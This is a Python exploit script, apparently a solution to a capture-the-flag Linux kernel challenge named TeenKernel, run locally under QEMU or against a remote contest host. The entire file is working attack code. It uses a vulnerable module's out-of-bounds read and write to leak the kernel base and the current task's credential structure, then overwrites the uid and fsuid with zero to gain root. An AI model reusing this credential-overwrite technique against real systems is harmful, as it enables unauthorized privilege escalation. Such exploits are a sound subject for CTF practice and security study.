#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bzimage = './bzImage'
initram = './initramfs.cpio.gz'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'PROC', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv': \
    'qemu-system-x86_64 -s -cpu max,+smap,+smep,check -m 64 -nographic -kernel {} -initrd {} -append'.format(bzimage, initram).split() + ["nokaslr console=ttyS0 init='/init'"]}, \
                        local   = {'argv': \
    'qemu-system-x86_64 -monitor /dev/null -cpu max,+smap,+smep,check -m 64 -nographic -kernel {} -initrd {}.bak -append'.format(bzimage, initram).split() + ["console=ttyS0 init='/init'"]}, \
                        remote  = {'host':'teenkernel.forfuture.fluxfingers.net', 'port':1337})
env.select()

#==========

kernel = ELF('vmlinux')
kernel.sep_function['copy_from_user']   = 0xffffffff811136d0
kernel.symbols['current_task']          = 0xffffffff81a3e040
offset_kernel_copy_from_user            = kernel.sep_function['copy_from_user'] - kernel.address

#==========

def attack(conn, **kwargs):
    tk = TeenKernel(conn)

    global addr_module_stack
    addr_module_stack           = tk.kk_read(0x20) - 0x40
    info('addr_module_stack = 0x{:08x}'.format(addr_module_stack))

    addr_kernel_copy_from_user  = tk.kk_read(-0x38) - 0x4b
    kernel.address = addr_kernel_copy_from_user - offset_kernel_copy_from_user
    info('addr_kernel_base  = 0x{:08x}'.format(kernel.address))
    addr_kernel_current_task    = kernel.symbols['current_task']

    addr_kernel_current         = leak(tk, addr_kernel_current_task)
    addr_kernel_cred            = leak(tk, addr_kernel_current + 0x40)
    uid_fsuid                   = leak(tk, addr_kernel_cred + 0x78)
    info('current uid : {}, fsuid : {}'.format(uid_fsuid&((1<<32)-1), uid_fsuid>>32))

    tamper(tk, addr_kernel_cred + 0x78, 0)
    conn.sendlineafter('> ', '4')

def leak(teen, addr):
    return teen.kk_read(addr - addr_module_stack)

def tamper(teen, addr, value):
    teen.kk_write(addr - addr_module_stack, value)

class TeenKernel:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

        if env.check('debug'):
            self.sendlineafter('# ', 'su user -c /client_kernel_kid')

    def kk_read(self, ofs):
        self.sendlineafter('> ', '1')
        self.sendlineafter('> ', str(ofs))
        self.recvuntil('alright: ')
        return int(self.recvuntil('\r\n', drop=True), 16)

    def kk_write(self, ofs, value):
        self.sendlineafter('> ', '2')
        self.sendlineafter('> ', str(ofs))
        self.sendlineafter('> ', str(value))

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.connection.interactive()

#==========
